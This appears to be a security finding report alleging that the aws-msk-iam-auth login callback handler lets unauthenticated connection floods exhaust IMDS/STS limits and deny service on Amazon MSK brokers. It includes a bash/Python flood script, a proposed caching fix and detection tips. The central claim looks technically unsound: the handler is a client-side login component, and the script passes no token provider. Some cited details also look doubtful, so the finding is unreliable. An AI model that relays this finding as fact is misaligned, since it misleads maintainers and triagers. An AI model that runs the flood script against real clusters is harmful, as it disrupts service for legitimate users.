# FINDING-009: MSK IAM — No Rate Limiting on Credential Resolution → DoS Amplification

## Metadata

| Field | Value |
|-------|-------|
| Finding ID | FINDING-009 |
| Target | `aws/aws-msk-iam-auth` |
| Component | `IAMOAuthBearerLoginCallbackHandler` |
| Source File | `src/main/java/software/amazon/msk/auth/iam/IAMOAuthBearerLoginCallbackHandler.java` |
| Approximate Lines | 98–115 (`handleCallback`), 122–145 (`generateTokenValue`) |
| Category | Denial of Service — Resource Amplification |
| CVSS v3.1 Estimate | **6.5 MEDIUM** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| CWE | CWE-400: Uncontrolled Resource Consumption |
| Requires Auth | NONE — only requires TCP connectivity to broker port 9098 |
| MSK Affected | YES — all MSK clusters using IAM authentication |

## Summary

`IAMOAuthBearerLoginCallbackHandler.handleCallback()` resolves AWS credentials synchronously via `credentialsProvider.resolveCredentials()` on every authentication attempt — with no rate limiting, backoff, circuit breaker, or credential caching. A flood of simultaneous TCP connections initiating SASL/OAUTHBEARER handshakes causes unbounded parallel credential resolution calls to IMDS (EC2 Instance Metadata Service) or STS. This exhausts IMDS connection quotas and STS rate limits, causing authentication failures for all clients — including legitimate ones.

## Vulnerable Code (verbatim)

```java
// IAMOAuthBearerLoginCallbackHandler.java — handleCallback (lines ~98-115)
private void handleCallback(OAuthBearerTokenCallback callback)
        throws IOException, URISyntaxException, ParseException {
    if (callback.token() != null) {
        throw new IllegalArgumentException("Callback had a token already");
    }

    // NO rate limiting. NO credential cache. NO concurrency cap.
    // Every auth attempt triggers a full IMDS/STS round-trip.
    AwsCredentials awsCredentials = credentialsProvider.resolveCredentials();

    String tokenValue = generateTokenValue(awsCredentials, getCurrentRegion());
    callback.token(getOAuthBearerToken(tokenValue));
    // awsCredentials (containing secretAccessKey String) not zeroed after use
}
```

```java
// generateTokenValue — credentials used but never zeroed
private String generateTokenValue(AwsCredentials awsCredentials, Region region) {
    // awsCredentials.secretAccessKey() is a plain String — cannot be zeroed
    final AuthenticationRequestParams params = AuthenticationRequestParams
        .create(getHostName(region), awsCredentials, UserAgentUtils.getUserAgentValue());
    final SdkHttpFullRequest signedRequest = aws4Signer.presignRequest(params);
    String signedUrl = signedRequest.toBuilder()
        .appendRawQueryParameter("User-Agent", UserAgentUtils.getUserAgentValue())
        .build().getUri().toString();
    return Base64.getUrlEncoder().withoutPadding()
        .encodeToString(signedUrl.getBytes(StandardCharsets.UTF_8));
}
```

## Root Cause

The MSK IAM auth library was designed to resolve fresh credentials on every authentication request to avoid stale credentials from short-lived IAM roles. However, there is no:
- **Rate limiter** on the `resolveCredentials()` call
- **Credential cache** with TTL (e.g., cache for 5 minutes, which is well within the 15-minute SigV4 window)
- **Circuit breaker** that stops retrying after IMDS is unresponsive
- **Concurrency cap** on simultaneous authentication attempts

AWS IMDS throttles at ~100 PUT token requests/second per instance. STS `AssumeRole` throttles at ~100 requests/second per IAM entity. With 500+ concurrent connections, both thresholds are exceeded, causing IMDS/STS to return throttling errors, which the auth library propagates as authentication failures to ALL connecting clients.

## Attack Prerequisites

- Network access to MSK broker port 9098 (IAM/TLS listener)
- No valid AWS credentials required — attacker only needs to initiate TCP connections and begin SASL handshakes
- The attack is amplified: each attacker connection triggers one IMDS/STS call from the broker-side auth library

## Step-by-Step Exploitation

```bash
# Simple connection flood using parallel bash subshells
# Each connection initiates SASL/OAUTHBEARER handshake without completing it
BROKER="b-1.CLUSTER.REGION.kafka.amazonaws.com:9098"

for i in $(seq 1 500); do
    (
        # Open TLS connection and send a partial SASL handshake
        # kafka-python handles the TLS + SASL framing
        python3 -c "
from kafka import KafkaProducer
import time
try:
    p = KafkaProducer(
        bootstrap_servers=['$BROKER'],
        security_protocol='SASL_SSL',
        sasl_mechanism='OAUTHBEARER',
        sasl_oauth_token_provider=None  # will fail auth but triggers credential resolution
    )
except Exception as e:
    pass  # expected auth failure
" 2>/dev/null
    ) &
done
wait
echo "Done. Check MSK CloudWatch for AuthenticationFailureCount spike."
```

## Expected Outcome

- MSK CloudWatch metric `ClientConnectionCount` spike
- `AuthenticationFailureCount` metric shows failures for ALL clients (including legitimate ones)
- IMDS returns HTTP 429 throttling errors
- STS returns `ThrottlingException`
- MSK broker logs: `Unable to resolve credentials: Rate exceeded`

## Amazon MSK Specific Impact

- **MSK with IAM:** All MSK clusters with IAM authentication (the recommended auth method) are affected
- **Broker-side amplification:** Each attacker TCP connection causes ONE broker-side IMDS/STS call — a 500-connection flood becomes 500 parallel IMDS calls, easily exceeding throttle limits
- **Legitimate client starvation:** Because IMDS is throttled globally for the broker's EC2 instance, legitimate clients who connect after the flood also fail authentication — the DoS affects all tenants, not just the attacker's connections
- **MSK Multi-AZ:** Each broker independently resolves credentials — attacking multiple brokers simultaneously multiplies the amplification effect
- **Resolution:** AWS rotated to IMDSv2 with higher default hop limits and TPS quotas, but IMDS TPS limits are still finite and reachable at scale

## Proposed Fix

Add credential caching with TTL and a connection rate limiter:

```java
// Add to IAMOAuthBearerLoginCallbackHandler:
private static final Cache<String, AwsCredentials> CRED_CACHE =
    CacheBuilder.newBuilder()
        .expireAfterWrite(4, TimeUnit.MINUTES)   // refresh before 15-min SigV4 TTL
        .maximumSize(10)
        .build();

private static final RateLimiter AUTH_RATE = RateLimiter.create(50.0);  // 50 auth/sec

private void handleCallback(OAuthBearerTokenCallback callback)
        throws IOException, URISyntaxException, ParseException {
    AUTH_RATE.acquire();  // throttle concurrent resolution
    AwsCredentials awsCredentials = CRED_CACHE.get("credentials",
        () -> credentialsProvider.resolveCredentials());
    // ...
}
```

## Detection

- **IMDS metric:** EC2 IMDSv2 throttling metric — CloudWatch `TokenTTL` or IMDS error logs
- **MSK metric:** `AuthenticationFailureCount` spike correlated with high `ClientConnectionCount`
- **Broker log pattern:** `software.amazon.awssdk.services.sts.model.ThrottlingException` in broker logs
- **Connection rate:** VPC Flow Logs showing a surge of connections to port 9098 from a single source
